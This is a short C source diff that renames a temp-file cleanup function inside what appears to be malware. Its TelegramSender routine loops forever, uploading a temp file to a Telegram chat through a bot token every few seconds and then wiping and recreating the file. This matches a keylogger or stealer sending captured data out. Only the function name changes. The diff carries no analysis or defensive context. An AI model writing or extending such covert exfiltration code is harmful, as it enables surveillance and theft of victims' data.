@@ -70,7 +70,7 @@ static int SendDocument(const char* chatId, const char* botToken)
 	return lpBuffer == "200";
 }
 
-static int DeleteTempFile()
+static int ClearTempFile()
 {
 	if (DeleteFileA(tempPath) == 0) { return 0; };
 	HANDLE hFile = CreateFileA(tempPath, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
@@ -85,6 +85,6 @@ void TelegramSender(const char* tgChatId, const char* tgBotToken)
 	do {
 		Sleep(SEND_DELAY * 1000);
 		SendDocument(tgChatId, tgBotToken);
-		DeleteTempFile();
+		ClearTempFile();
 	} while (1);
 }
